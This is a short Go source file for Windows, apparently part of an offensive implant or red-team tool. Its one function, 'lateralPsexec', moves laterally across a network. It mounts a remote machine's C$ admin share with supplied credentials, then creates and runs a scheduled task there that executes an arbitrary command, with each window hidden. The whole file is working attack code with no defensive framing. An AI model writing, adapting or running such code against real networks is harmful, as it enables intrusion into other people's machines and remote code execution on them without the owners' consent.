//go:build windows
// +build windows

package main

import (
	"fmt"
	"os/exec"
	"strconv"
	"time"
)

func lateralPsexec(target, user, pass, cmd string) (string, error) {
	if cmd == "" {
		cmd = "whoami"
	}
	if user != "" {
		nc := exec.Command("cmd", "/c", fmt.Sprintf(`net use \\%s\C$ /user:%s %s`, target, user, pass))
		applyHideWindow(nc)
		nc.CombinedOutput()
	}

	schName := "ForgeLateral" + strconv.Itoa(int(time.Now().Unix()%10000))
	schCmd := fmt.Sprintf(`schtasks /s %s /u %s /p %s /create /tn %s /tr "cmd.exe /c %s" /sc once /st 00:00 /f`, target, user, pass, schName, cmd)
	if user == "" {
		schCmd = fmt.Sprintf(`schtasks /s %s /create /tn %s /tr "cmd.exe /c %s" /sc once /st 00:00 /f`, target, schName, cmd)
	}
	c := exec.Command("cmd", "/c", schCmd)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	res := string(out)
	if err == nil {
		runSch := exec.Command("cmd", "/c", fmt.Sprintf(`schtasks /s %s /run /tn %s`, target, schName))
		applyHideWindow(runSch)
		ro, _ := runSch.CombinedOutput()
		res += "\n" + string(ro)
	}
	return res, err
}
